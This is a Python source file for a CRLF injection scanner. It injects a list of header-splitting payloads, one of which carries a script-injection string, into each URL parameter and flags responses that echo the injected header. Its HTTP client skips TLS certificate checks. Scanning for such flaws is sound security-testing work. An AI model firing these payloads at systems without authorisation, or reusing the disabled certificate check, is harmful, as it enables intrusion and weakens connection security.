"""CRLF Injection Scanner."""
from __future__ import annotations

import asyncio
from urllib.parse import urlencode, urlparse, parse_qs

import httpx

CRLF_PAYLOADS = [
    "%0d%0aInjected-Header:CyberHunter",
    "%0aInjected-Header:CyberHunter",
    "%0d%0a%0d%0a<script>alert(1)</script>",
    "%E5%98%8A%E5%98%8DInjected-Header:CyberHunter",
    "\\r\\nInjected-Header:CyberHunter",
]


async def scan_crlf(
    url: str,
    params: dict | None = None,
    method: str = "GET",
    headers: dict | None = None,
) -> list[dict]:
    findings: list[dict] = []
    parsed = urlparse(url)
    test_params = params or parse_qs(parsed.query)
    if not test_params:
        test_params = {"q": ["test"]}

    async with httpx.AsyncClient(timeout=10.0, follow_redirects=False, verify=False) as client:
        for param_name in test_params:
            for payload in CRLF_PAYLOADS:
                test_p = {k: (v[0] if isinstance(v, list) else v) for k, v in test_params.items()}
                test_p[param_name] = payload

                try:
                    if method.upper() == "GET":
                        test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{urlencode(test_p, safe='')}"
                        resp = await client.get(test_url, headers=headers or {})
                    else:
                        resp = await client.post(url, data=test_p, headers=headers or {})

                    if "injected-header" in {k.lower(): v for k, v in resp.headers.items()}:
                        findings.append({
                            "type": "crlf",
                            "url": url,
                            "param": param_name,
                            "payload": payload,
                            "evidence": "Custom header injected into response",
                            "confidence": 92,
                        })
                except Exception:
                    continue
                await asyncio.sleep(0.05)

    return findings
